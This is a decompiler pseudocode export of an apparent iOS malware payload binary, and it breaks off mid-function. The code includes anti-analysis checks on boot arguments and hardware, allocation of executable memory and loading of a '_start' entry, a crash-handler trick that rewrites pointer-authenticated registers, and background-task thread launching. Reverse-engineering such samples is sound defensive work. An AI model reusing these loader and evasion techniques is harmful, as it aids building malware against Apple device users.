// Pseudocode / Disassembly export
// Source: final_payload_A_16434916_macho.bin
// Functions: 167
// Hex-Rays: available
// Generated: 2026-03-05 01:07:34

////////////////////////////////////////////////////////////////////////
// Function: sub_5CEC
// Address:  0x5CEC  Size: 64 bytes
// Calls:    sub_7BC0, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

bool sub_5CEC()
{
  return (unsigned int)sub_7BC0() != 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5D2C
// Address:  0x5D2C  Size: 60 bytes
// Calls:    sub_B0FC
// Xrefs:    21 callers
////////////////////////////////////////////////////////////////////////

void sub_5D2C()
{
  ;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5D68
// Address:  0x5D68  Size: 96 bytes
// Calls:    sub_7BC0, sub_7BA0, sub_B0FC
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5D68(__int64 a1, __int64 a2)
{
  if ( (unsigned int)sub_7BC0() )
    return sub_7BA0(a1, a2);
  return a1;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5DC8
// Address:  0x5DC8  Size: 176 bytes
// Calls:    _sys_dcache_flush, _sys_icache_invalidate, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5DC8(__int64 result, __int64 a2, unsigned int a3)
{
  unsigned int v3; // w19
  __int64 v4; // x20
  unsigned int v5; // w23
  unsigned int v6; // w8
  unsigned int v7; // w25
  __int64 v8; // x21

  if ( !a2 || (v3 = a3, v4 = a2, !a3) )
  {
    v3 = *(_DWORD *)(result + 144);
    if ( !v3 )
      return result;
    v4 = *(_QWORD *)(result + 136);
  }
  v5 = 0;
  v6 = v3;
  do
  {
    v7 = v6 - 327680;
    if ( v6 >= 0x50000 )
      v8 = 327680;
    else
      v8 = v6;
    sys_dcache_flush(v4 + v5, v8);
    result = sys_icache_invalidate(v4 + v5, v8);
    v5 += 327680;
    v6 = v7;
  }
  while ( v3 > v5 );
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5E78
// Address:  0x5E78  Size: 212 bytes
// Calls:    _bzero, sub_B0FC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5E78(__int64 a1, unsigned int a2)
{
  __int64 v3; // x8
  unsigned int *v4; // x10
  __int64 v5; // x9
  unsigned int v6; // w11
  unsigned int v7; // w12
  unsigned int v8; // w13
  void *v9; // x0

  v3 = *(unsigned int *)(a1 + 144);
  v4 = *(unsigned int **)(a1 + 312);
  v5 = *(_QWORD *)(a1 + 136) + v3;
  if ( !v4 )
    v4 = (unsigned int *)(v5 - 4);
LABEL_3:
  v6 = atomic_load(v4);
  v7 = v6 + a2 + 4 * (v6 == 0);
  if ( v7 > (unsigned int)v3 )
    return 49155;
  do
  {
    v8 = __ldaxr(v4);
    if ( v8 != v6 )
    {
      __clrex();
      goto LABEL_3;
    }
  }
  while ( __stlxr(v7, v4) );
  v9 = (void *)(v5 - v7);
  *(_QWORD *)(a1 + 72) = v9;
  *(_DWORD *)(a1 + 80) = a2;
  bzero(v9, a2);
  if ( *(_QWORD *)(a1 + 288) )
    sub_B0FC(a1, *(_QWORD *)(a1 + 72), *(unsigned int *)(a1 + 80));
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5F4C
// Address:  0x5F4C  Size: 84 bytes
// Calls:    sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5F4C(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 v2; // x9
  __int64 v3; // x8

  v2 = *(unsigned int *)(a1 + 80);
  if ( v2 < a2 )
    return 0;
  v3 = *(_QWORD *)(a1 + 72);
  *(_QWORD *)(a1 + 72) = v3 + a2;
  *(_DWORD *)(a1 + 80) = v2 - a2;
  return v3;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5FA0
// Address:  0x5FA0  Size: 76 bytes
// Calls:    _bzero, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_5FA0(int a1, void *a2, size_t a3)
{
  if ( a2 && a3 )
    bzero(a2, a3);
  return 0;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_5FEC
// Address:  0x5FEC  Size: 2284 bytes
// Calls:    sub_B0FC, sub_AD8C, sub_8430, sub_A418, _task_info, sub_8798, sub_87D8, sub_8840, sub_88B4, sub_8928, _mmap, sub_8590, _vm_allocate, _memcpy, _vm_protect
// Xrefs:    2 callers
// Strings:  "_start", "	P@"
////////////////////////////////////////////////////////////////////////

// bad sp value at call has been detected, the output may be wrong!
__int64 __fastcall sub_5FEC(
        __int64 a1,
        __int64 a2,
        int a3,
        _DWORD *a4,
        int a5,
        int a6,
        int a7,
        int a8,
        __int64 a9,
        int a10,
        int a11,
        __int64 a12,
        mach_msg_type_number_t a13,
        unsigned int a14,
        __int64 a15,
        __int64 a16,
        int a17,
        unsigned int __na,
        size_t __n,
        __int64 a20,
        __int64 a21,
        __int64 task_info_out,
        __int64 a23,
        int a24)
{
  __int64 v27; // x0
  __int64 v28; // x21
  __int64 v29; // x0
  __int64 v30; // x1
  __int64 v32; // x0
  __int64 v33; // x0
  __int64 v34; // x0
  __int64 v35; // x2
  kern_return_t v36; // w0
  __int64 v37; // x1
  __int64 v38; // x2
  __int64 v39; // x22
  unsigned __int64 v40; // x8
  vm_address_t v41; // x21
  __int64 v42; // x1
  __int64 v43; // x2
  vm_address_t v44; // x22
  unsigned __int64 v45; // x0
  __int64 v46; // x1
  __int64 v47; // x2
  __int64 v48; // x22
  __int64 v49; // x0
  vm_address_t v50; // x8
  kern_return_t v51; // w0
  int v52; // w8
  __int64 v53[8]; // [xsp+20h] [xbp-80h] BYREF
  mach_msg_type_number_t task_info_outCnt; // [xsp+64h] [xbp-3Ch] BYREF
  vm_address_t address; // [xsp+68h] [xbp-38h] BYREF
  __int64 v56; // [xsp+B0h] [xbp+10h]

  v53[0] = 0;
  if ( a1 && *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    sub_B0FC(a1, 835585, 0);
  v27 = sub_B0FC(a1, a2, v53);
  if ( (_DWORD)v27 )
  {
    v28 = v27;
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    {
LABEL_8:
      v29 = a1;
      v30 = v28;
LABEL_9:
      sub_B0FC(v29, v30, 0);
      return v28;
    }
    return v28;
  }
  if ( !a15 || a14 <= 3 )
  {
    v28 = 708609;
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    {
      v29 = a1;
      v30 = 708609;
      goto LABEL_9;
    }
    return v28;
  }
  if ( *(_QWORD *)(a1 + 152) )
    sub_AD8C();
  v32 = sub_8430(&a15, &a14);
  if ( (_DWORD)v32 )
  {
    v28 = v32;
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
      goto LABEL_8;
    return v28;
  }
  if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    sub_B0FC(a1, 835586, 0);
  a12 = 0;
  a11 = 0;
  v33 = sub_B0FC(a1, 458752, a15);
  if ( (_DWORD)v33 )
  {
    v28 = v33;
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
      goto LABEL_8;
    return v28;
  }
  v34 = sub_A418(a1, 458752, &a12, &a11);
  if ( (_DWORD)v34 )
  {
    v28 = v34;
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
      goto LABEL_8;
    return v28;
  }
  *(_QWORD *)(a1 + 104) = a12;
  *(_DWORD *)(a1 + 112) = a11;
  if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    sub_B0FC(a1, 835587, 0);
  if ( *(_BYTE *)(a1 + 1474) || *(_BYTE *)(a1 + 1475) )
  {
    if ( !*(_BYTE *)(a1 + 1513) || *(_BYTE *)(a1 + 1512) )
    {
LABEL_40:
      *(_BYTE *)(a1 + 1476) = 1;
      goto LABEL_41;
    }
    task_info_outCnt = 5;
    task_info_out = 0;
    a23 = 0;
    a24 = 0;
    address = 0;
    v36 = task_info(mach_task_self_, 0x11u, (task_info_t)&task_info_out, &task_info_outCnt);
    if ( v36 )
    {
      v28 = v36 | 0x80000000;
      goto LABEL_51;
    }
    if ( !task_info_out )
    {
      v28 = 20487;
      goto LABEL_51;
    }
    v44 = *(_QWORD *)(task_info_out + 40) & 0xFFFFFFFFFFFFFFFELL;
    if ( v44 )
    {
      address = *(_QWORD *)v44;
      if ( !address )
      {
        v28 = 4097;
        goto LABEL_51;
      }
    }
    else
    {
      v56 = task_info_out;
      a20 = 0;
      a21 = 0;
      __n = 0;
      __na = 0;
      v49 = sub_B0FC(a1, 327680, &__n);
      if ( (_DWORD)v49
        || (v49 = sub_8590(a1, 589825, &a21), (_DWORD)v49)
        || (v49 = sub_87D8(a21, 0, &a20), (_DWORD)v49)
        || (a16 = mach_task_self_, v49 = sub_8840(a21, a20, 3221225499LL, &a16), (_DWORD)v49)
        || (!BYTE6(a16) || !BYTE5(a16))
        && (*(_WORD *)((char *)&a16 + 5) = 257, v49 = sub_8840(a21, a20, 1073741851, &a16), (_DWORD)v49)
        || (v49 = sub_8840(a21, a20, 13, 0), (_DWORD)v49) )
      {
        v28 = v49;
        v44 = 0;
      }
      else
      {
        v44 = (vm_address_t)mmap(0, 0x1000000u, 3, 6146, -1, 0);
        if ( v44 == -1 )
        {
          v52 = *__error();
          if ( v52 < 0 )
            v52 = -v52;
          v28 = v52 | 0x40000000u;
        }
        else
        {
          v51 = vm_allocate(mach_task_self_, &address, 0x1000000u, 1);
          if ( v51
            || (*(_QWORD *)v44 = address,
                memcpy((void *)(v44 + vm_page_size), (const void *)__n, __na),
                (v51 = vm_protect(mach_task_self_, v44, 0x1000000u, 0, 7)) != 0) )
          {
            v28 = v51 | 0x80000000;
          }
          else
          {
            v28 = sub_8840(a21, a20, 38, 0);
            if ( !(_DWORD)v28 )
              *(_QWORD *)(v56 + 40) = *(_QWORD *)(v56 + 40) & 1LL | v44;
          }
        }
      }
      v37 = a21;
      if ( a21 )
      {
        if ( a20 )
        {
          sub_88B4(a21, a20);
          v37 = a21;
        }
        sub_8928(a1, v37);
      }
      if ( (_DWORD)v28 )
      {
LABEL_51:
        if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
          goto LABEL_8;
        return v28;
      }
    }
    sub_B0FC(a1, v37, v38);
    v50 = address;
    *(_QWORD *)(a1 + 136) = address + 0x100000;
    *(_DWORD *)(a1 + 144) = 15728640;
    *(_QWORD *)(a1 + 312) = v50 + 16777212;
    *(_QWORD *)(a1 + 1488) = v44;
    *(_QWORD *)(a1 + 1496) = v50;
    *(_DWORD *)(a1 + 80) = 0;
    *(_QWORD *)(a1 + 296) = sub_5E78;
    *(_QWORD *)(a1 + 40) = sub_5F4C;
    *(_QWORD *)(a1 + 176) = sub_5FA0;
    *(_BYTE *)(a1 + 1479) = 1;
    *(_WORD *)(a1 + 1476) = 1;
    goto LABEL_41;
  }
  if ( task_info(mach_task_self_, 0x11u, (task_info_t)&task_info_out, &a13) || (v39 = task_info_out) == 0 )
  {
    if ( !*(_BYTE *)(a1 + 1515) || !*(_QWORD *)(a1 + 1520) )
      return 20487;
    v28 = 20487;
    v29 = a1;
    v30 = 20487;
    goto LABEL_9;
  }
  v40 = *(_QWORD *)(task_info_out + 40) & 0xFFFFFFFFFFFFFFFELL;
  if ( v40 )
  {
    if ( (vm_page_mask & v40) != 0 )
    {
      if ( !*(_BYTE *)(a1 + 1515) || !*(_QWORD *)(a1 + 1520) )
        return 20486;
      v28 = 20486;
      v29 = a1;
      v30 = 20486;
      goto LABEL_9;
    }
    *(_QWORD *)(a1 + 312) = 0;
    *(_QWORD *)(a1 + 136) = v40;
    *(_DWORD *)(a1 + 144) = 0x1000000;
    *(_DWORD *)(a1 + 80) = 0;
    *(_OWORD *)(a1 + 1488) = 0u;
  }
  else
  {
    v28 = sub_8798(a1, &a21);
    if ( !(_DWORD)v28 )
    {
      v28 = sub_87D8(a21, 0, &address);
      if ( !(_DWORD)v28 )
      {
        v28 = sub_8840(a21, address, 13, 0);
        sub_88B4(a21, address);
      }
      sub_8928(a1, a21);
    }
    if ( (_DWORD)v28 == 28675 )
      goto LABEL_40;
    if ( (_DWORD)v28 )
    {
      if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
        goto LABEL_8;
      return v28;
    }
    v45 = (unsigned __int64)mmap(0, 0x1000000u, 7, 6146, -1, 0);
    if ( v45 == -1 )
      v46 = 20488;
    else
      v46 = 0;
    if ( v45 == -1 )
    {
      if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
        sub_B0FC(a1, v46, 0);
      return 20488;
    }
    *(_QWORD *)(a1 + 312) = 0;
    *(_QWORD *)(a1 + 136) = v45;
    *(_DWORD *)(a1 + 144) = 0x1000000;
    *(_DWORD *)(a1 + 80) = 0;
    *(_OWORD *)(a1 + 1488) = 0u;
    *(_QWORD *)(v39 + 40) = *(_QWORD *)(v39 + 40) & 1LL | v45;
  }
LABEL_41:
  if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    sub_B0FC(a1, 835588, 0);
  v28 = sub_B0FC(a1, 0x80000, v35);
  if ( (_DWORD)v28 || (v28 = sub_B0FC(a1, 0x80000, &address), (_DWORD)v28) )
  {
LABEL_46:
    if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
      goto LABEL_8;
    return v28;
  }
  v41 = address;
  if ( !address )
  {
    v28 = 20484;
    goto LABEL_46;
  }
  if ( *(_QWORD *)(a1 + 288) )
    sub_B0FC(a1, *(_QWORD *)(address + 88), *(unsigned int *)(address + 168));
  v28 = sub_B0FC(a1, v41, "_start");
  if ( !(_DWORD)v28 )
  {
    if ( address )
    {
      if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
        sub_B0FC(a1, 835589, 0);
      v48 = sub_B0FC(a1, v42, v43);
      if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
        sub_B0FC(a1, v48, 0);
      sub_B0FC(a1, 0x80000, v47);
      v28 = 0;
      *a4 = v48;
      return v28;
    }
    v28 = 20485;
  }
  if ( *(_BYTE *)(a1 + 1515) && *(_QWORD *)(a1 + 1520) )
    goto LABEL_8;
  return v28;
}


////////////////////////////////////////////////////////////////////////
// Function: _process
// Address:  0x68D8  Size: 876 bytes
// Calls:    sub_96F8, sub_8210, sub_7720, sub_8AB8, sub_B0FC, sub_71FC, _sysctlbyname, _bzero, _mach_host_self, _host_info, sub_8298, _malloc, _memcpy, _strdup, _pthread_attr_init
// Strings:  "hw.l2cachesize", "kern.bootargs"
////////////////////////////////////////////////////////////////////////

// bad sp value at call has been detected, the output may be wrong!
__int64 __fastcall process(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        size_t a10)
{
  __int64 v10; // x21
  __int64 result; // x0
  int v13; // w1
  int v14; // w2
  int v15; // w3
  int v16; // w4
  int v17; // w5
  int v18; // w6
  int v19; // w7
  unsigned int v20; // w8
  int v21; // w8
  int v22; // w9
  int v23; // w0
  unsigned int v24; // w8
  unsigned int v25; // w8
  int v26; // w8
  mach_port_t v27; // w0
  kern_return_t v28; // w8
  _QWORD *v29; // x0
  _QWORD *v30; // x20
  const char *v31; // x0
  char *v32; // x0
  _OWORD *v33; // x19
  _OWORD *v34; // x0
  __int128 v35; // q1
  const char *v36; // x0
  char *v37; // x0
  const char *v38; // x0
  char *v39; // x0
  const char *v40; // x0
  char *v41; // x0
  __int64 v42; // x0
  void *(__cdecl *v43)(void *); // x0
  __int64 v44; // [xsp+0h] [xbp-430h]
  __int64 v45; // [xsp+8h] [xbp-428h]
  __int64 v46; // [xsp+10h] [xbp-420h]
  __int64 v47; // [xsp+18h] [xbp-418h]
  __int64 v48; // [xsp+20h] [xbp-410h]
  __int64 v49; // [xsp+28h] [xbp-408h]
  __int64 v50; // [xsp+30h] [xbp-400h]
  __int64 v51; // [xsp+38h] [xbp-3F8h]
  __int64 v52; // [xsp+40h] [xbp-3F0h]
  __int64 v53; // [xsp+48h] [xbp-3E8h]
  char v54; // [xsp+50h] [xbp-3E0h]
  size_t v55; // [xsp+408h] [xbp-28h] BYREF

  v10 = 708617;
  if ( !a1 )
    return 708609;
  result = sub_96F8(a1, a2, a3, a4, a5, a6, a7, a8);
  if ( !(_DWORD)result )
  {
    result = sub_8210(a1);
    if ( !(_DWORD)result )
    {
      result = sub_7720(
                 a1,
                 v13,
                 v14,
                 v15,
                 v16,
                 v17,
                 v18,
                 v19,
                 v44,
                 v45,
                 v46,
                 v47,
                 v48,
                 v49,
                 v50,
                 SHIDWORD(v50),
                 v51,
                 v52,
                 SHIDWORD(v52),
                 v53,
                 SHIDWORD(v53),
                 v54);
      if ( !(_DWORD)result )
      {
        result = sub_8AB8(a1);
        if ( !(_DWORD)result )
        {
          result = 708616;
          if ( (unsigned __int64)(*(_QWORD *)(a1 + 208) - 0x18090006700000LL) <= 0xF090EFE400003LL )
          {
            if ( *(_BYTE *)(a1 + 1512) )
            {
              result = 159753;
              v20 = *(_DWORD *)(a1 + 192);
              if ( v20 < 0x100000 )
                return result;
              if ( v20 >= 0x100401 )
              {
                v21 = *(_DWORD *)(a1 + 224);
                if ( v21 > 458787762 )
                {
                  if ( v21 != 1176831186 )
                  {
                    v22 = 458787763;
LABEL_17:
                    if ( v21 != v22 )
                      return result;
                  }
                }
                else if ( v21 != -2023363094 )
                {
                  v22 = -634136515;
                  goto LABEL_17;
                }
              }
            }
            LOBYTE(a10) = 1;
            v23 = sub_71FC(&a10);
            if ( (_BYTE)a10 )
              v24 = 0;
            else
              v24 = 708644;
            if ( v23 )
              result = 708619;
            else
              result = v24;
            if ( !(_DWORD)result )
            {
              v25 = *(_DWORD *)(a1 + 192);
              result = 708616;
              if ( v25 <= 0x1102FF )
              {
                if ( v25 < 0xE0000
                  || ((a10 = 8, v55 = 0, v26 = sysctlbyname("hw.l2cachesize", &v55, &a10, 0, 0), !(v55 >> 20))
                    ? (result = 708644)
                    : (result = 0),
                      v26 || v55 >= 0x100000) )
                {
                  v55 = 1024;
                  bzero(&a10, 0x400u);
                  if ( !sysctlbyname("kern.bootargs", &a10, &v55, 0, 0)
                    && (_BYTE)a10
                    && ((unsigned __int8)a10 != 32 || BYTE1(a10)) )
                  {
                    return 708644;
                  }
                  if ( *(_DWORD *)(a1 + 192) > 0xF0000u )
                    goto LABEL_42;
                  LODWORD(a10) = 1;
                  v27 = mach_host_self();
                  v28 = host_info(v27, 11, (host_info_t)&v55, (mach_msg_type_number_t *)&a10);
                  result = (_DWORD)v55 ? 708644LL : 0LL;
                  if ( v28 )
                    goto LABEL_42;
                }
                if ( !(_DWORD)result )
                {
LABEL_42:
                  result = sub_8298(a1);
                  if ( !(_DWORD)result )
                  {
                    v29 = malloc(0x648u);
                    if ( v29 )
                    {
                      v30 = v29;
                      memcpy(v29, (const void *)a1, 0x648u);
                      v31 = (const char *)v30[16];
                      if ( v31 )
                      {
                        v32 = strdup(v31);
                        if ( !v32 )
                          return v10;
                        v30[16] = v32;
                      }
                      v33 = (_OWORD *)v30[19];
                      if ( v33 )
                      {
                        v34 = malloc(0x20u);
                        if ( !v34 )
                          return v10;
                        v35 = v33[1];
                        *v34 = *v33;
                        v34[1] = v35;
                        v30[19] = v34;
                      }
                      v36 = (const char *)v30[15];
                      if ( v36 )
                      {
                        v37 = strdup(v36);
                        if ( !v37 )
                          return v10;
                        v30[15] = v37;
                      }
                      v38 = (const char *)v30[20];
                      if ( v38 )
                      {
                        v39 = strdup(v38);
                        if ( !v39 )
                          return v10;
                        v30[20] = v39;
                      }
                      v40 = (const char *)v30[21];
                      if ( !v40 )
                        goto LABEL_59;
                      v41 = strdup(v40);
                      if ( v41 )
                      {
                        v30[21] = v41;
LABEL_59:
                        v10 = 118785;
                        if ( !pthread_attr_init((pthread_attr_t *)&a10) )
                        {
                          if ( !pthread_attr_setdetachstate((pthread_attr_t *)&a10, 2) )
                          {
                            sub_5D2C();
                            v43 = (void *(__cdecl *)(void *))sub_B15C(v42, 0);
                            if ( pthread_create((pthread_t *)&v55, (const pthread_attr_t *)&a10, v43, v30) )
                              v10 = 118786;
                            else
                              v10 = 0;
                          }
                          pthread_attr_destroy((pthread_attr_t *)&a10);
                        }
                      }
                    }
                    return v10;
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6C44
// Address:  0x6C44  Size: 640 bytes
// Calls:    sub_5CEC, sub_5D68, _sigaction, ___error, _objc_alloc, sub_B1D4, sub_B15C, _malloc, _memcpy, _objc_msgSend$beginBackgroundTaskWithExpirationHandler:, -[UIApplication beginBackgroundTaskWithExpirationHandler:], sub_5FEC, _objc_msgSend$endBackgroundTask:, -[UIApplication endBackgroundTask:], __Block_object_dispose
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6C44(__int64 a1)
{
  __int64 v2; // x20
  int v3; // w8
  int v4; // w25
  UIApplication *v5; // x0
  UIApplication *v6; // x21
  const void *v7; // x23
  size_t v8; // x24
  void *v9; // x0
  __int64 v10; // x22
  void *v11; // x0
  int v12; // w2
  int v13; // w4
  int v14; // w5
  int v15; // w6
  int v16; // w7
  __int64 v17; // x1
  unsigned int v18; // w0
  void *v19; // x2
  int v20; // w8
  __int64 v22; // [xsp+0h] [xbp-B0h]
  int v23[2]; // [xsp+8h] [xbp-A8h] BYREF
  __int64 v24; // [xsp+10h] [xbp-A0h]
  mach_msg_type_number_t v25[2]; // [xsp+18h] [xbp-98h] BYREF
  __int64 v26; // [xsp+20h] [xbp-90h]
  __int64 v27; // [xsp+28h] [xbp-88h]
  sigaction *v28; // [xsp+30h] [xbp-80h]
  sigaction v29; // [xsp+38h] [xbp-78h] BYREF
  __int64 v30; // [xsp+48h] [xbp-68h]
  integer_t task_info_out[2]; // [xsp+50h] [xbp-60h]
  sigaction v32; // [xsp+58h] [xbp-58h] BYREF
  unsigned int v33; // [xsp+6Ch] [xbp-44h] BYREF

  v2 = 708617;
  v33 = 708608;
  if ( *(unsigned __int16 *)(a1 + 194) > 0xEu || !sub_5CEC() )
  {
    v4 = 0;
    goto LABEL_8;
  }
  v29.__sigaction_u.__sa_handler = (void (__cdecl *)(int))sub_5D68((__int64)sub_6FEC, 0);
  *(_QWORD *)&v29.sa_mask = 0x4000000000LL;
  if ( !sigaction(11, &v29, &v32) )
  {
    v4 = 1;
LABEL_8:
    v29.__sigaction_u.__sa_handler = 0;
    *(_QWORD *)&v29.sa_mask = &v29;
    v30 = 0x2020000000LL;
    *(_QWORD *)task_info_out = UIBackgroundTaskInvalid;
    v5 = objc_alloc(&OBJC_CLASS___UIApplication);
    if ( v5 )
    {
      v6 = v5;
      *(_QWORD *)v23 = _NSConcreteStackBlock;
      v24 = 3254779904LL;
      *(_QWORD *)v25 = sub_6EC4;
      v26 = (__int64)&unk_C090;
      v27 = (__int64)v5;
      v28 = &v29;
      if ( !sub_5CEC() )
        goto LABEL_13;
      *(_QWORD *)v23 = sub_B1D4(_NSConcreteStackBlock, (unsigned __int64)v23 | 0x6AE1000000000000LL);
      *(_QWORD *)v25 = sub_B15C(*(_QWORD *)v25, v25);
      v7 = (const void *)v26;
      if ( !v26 )
        goto LABEL_13;
      v8 = *(_QWORD *)(v26 + 8);
      v9 = malloc(v8);
      if ( v9 )
      {
        v10 = (__int64)v9;
        memcpy(v9, v7, v8);
        *(_QWORD *)(v10 + 16) = sub_B15C(*(_QWORD *)(v10 + 16), v10 + 16);
        *(_QWORD *)(v10 + 24) = sub_B15C(*(_QWORD *)(v10 + 24), v10 + 24);
        v26 = v10;
LABEL_13:
        v11 = -[UIApplication beginBackgroundTaskWithExpirationHandler:](
                v6,
                "beginBackgroundTaskWithExpirationHandler:",
                v23);
        *(_QWORD *)(*(_QWORD *)&v29.sa_mask + 24LL) = v11;
        v17 = *(_QWORD *)(a1 + 128);
        if ( v17 )
        {
          v18 = sub_5FEC(
                  a1,
                  v17,
                  v12,
                  &v33,
                  v13,
                  v14,
                  v15,
                  v16,
                  v22,
                  v23[0],
                  v23[1],
                  v24,
                  v25[0],
                  v25[1],
                  v26,
                  v27,
                  (int)v28,
                  HIDWORD(v28),
                  (size_t)v29.__sigaction_u.__sa_handler,
                  *(__int64 *)&v29.sa_mask,
                  v30,
                  *(__int64 *)task_info_out,
                  (__int64)v32.__sigaction_u.__sa_handler,
                  v32.sa_mask);
          if ( v18 )
            v2 = v18;
          else
            v2 = v33;
          v19 = *(void **)(*(_QWORD *)&v29.sa_mask + 24LL);
        }
        else
        {
          v19 = v11;
          v2 = 0;
        }
        if ( v19 != (void *)UIBackgroundTaskInvalid )
        {
          -[UIApplication endBackgroundTask:](v6, "endBackgroundTask:");
          *(_QWORD *)(*(_QWORD *)&v29.sa_mask + 24LL) = UIBackgroundTaskInvalid;
        }
        if ( v4 && sigaction(11, &v32, 0) )
        {
          v20 = *__error();
          if ( v20 < 0 )
            v20 = -v20;
          v2 = v20 | 0x40000000u;
        }
        else if ( *(_BYTE *)(a1 + 1516) )
        {
          exit(0);
        }
      }
    }
    _Block_object_dispose(&v29, 8);
    return v2;
  }
  v3 = *__error();
  if ( v3 < 0 )
    v3 = -v3;
  return v3 | 0x40000000u;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6EC4
// Address:  0x6EC4  Size: 108 bytes
// Calls:    _objc_msgSend$endBackgroundTask:, sub_B0FC
// Xrefs:    1 callers
////////////////////////////////////////////////////////////////////////

void *__fastcall sub_6EC4(__int64 a1)
{
  void *result; // x0

  result = objc_msgSend(
             *(id *)(a1 + 32),
             "endBackgroundTask:",
             *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 40) + 8LL) + 24LL));
  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 40) + 8LL) + 24LL) = UIBackgroundTaskInvalid;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6F30
// Address:  0x6F30  Size: 100 bytes
// Calls:    __Block_object_assign, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void __fastcall sub_6F30(__int64 a1, __int64 a2)
{
  _Block_object_assign((void *)(a1 + 32), *(const void **)(a2 + 32), 3);
  _Block_object_assign((void *)(a1 + 40), *(const void **)(a2 + 40), 8);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6F94
// Address:  0x6F94  Size: 88 bytes
// Calls:    __Block_object_dispose, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

void __fastcall sub_6F94(__int64 a1)
{
  _Block_object_dispose(*(const void **)(a1 + 40), 8);
  _Block_object_dispose(*(const void **)(a1 + 32), 3);
}


////////////////////////////////////////////////////////////////////////
// Function: sub_6FEC
// Address:  0x6FEC  Size: 164 bytes
// Calls:    _abort, sub_5D68, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_6FEC(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 *v3; // x19
  unsigned __int64 v4; // x8
  __int64 result; // x0
  __int64 v6; // x9
  unsigned __int64 v7; // x10
  __int64 v8; // x0
  __int64 v9; // x8

  v3 = *(__int64 **)(a3 + 48);
  v4 = v3[34];
  if ( v4 >> 39 != 0x4000 )
  {
    v6 = *v3;
    v7 = *v3 & 0xFFFFFF8000000000LL;
    if ( v7 == 0x2000000000000000LL )
    {
      v8 = v6 & 0x7FFFFFFFFFLL;
      if ( (v6 & 0x7FFFFFFFFFLL) != (v4 & 0x7FFFFFFFFFLL) )
        goto LABEL_8;
    }
    else
    {
      v8 = v6 & 0x7FFFFFFFFFLL;
      v9 = v4 & 0x7FFFFFFFFFLL;
      if ( v7 != 0x20000000000000LL || v8 != v9 )
LABEL_8:
        abort();
    }
    result = sub_5D68(v8, 29825);
    goto LABEL_11;
  }
  result = v4 & 0xFFDFFFFFFFFFFFFFLL;
LABEL_11:
  v3[34] = result;
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_7090
// Address:  0x7090  Size: 364 bytes
// Calls:    sub_7A98, _CFStringCreateWithCString, _CFDictionaryGetValue, _CFGetTypeID, _CFStringGetTypeID, _CFStringGetSystemEncoding, _CFStringGetCString, _CFRelease, _sscanf, sub_B0FC
// Xrefs:    2 callers
// Strings:  "/System/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist", "/System/Library/CoreServices/SystemVersion.plist", "ProductVersion", "%d.%d.%d"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_7090(int *a1)
{
  const __CFDictionary *v2; // x20
  CFStringRef v3; // x0
  CFStringRef v4; // x21
  const __CFString *Value; // x0
  const __CFString *v6; // x22
  CFTypeID v7; // x23
  CFStringEncoding SystemEncoding; // w0
  int CString; // w22
  char buffer[32]; // [xsp+24h] [xbp-5Ch] BYREF
  int v12; // [xsp+44h] [xbp-3Ch] BYREF
  int v13; // [xsp+48h] [xbp-38h] BYREF
  int v14; // [xsp+4Ch] [xbp-34h] BYREF

  v12 = 0;
  v2 = (const __CFDictionary *)sub_7A98("/System/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist");
  if ( !v2 )
  {
    v2 = (const __CFDictionary *)sub_7A98("/System/Library/CoreServices/SystemVersion.plist");
    if ( !v2 )
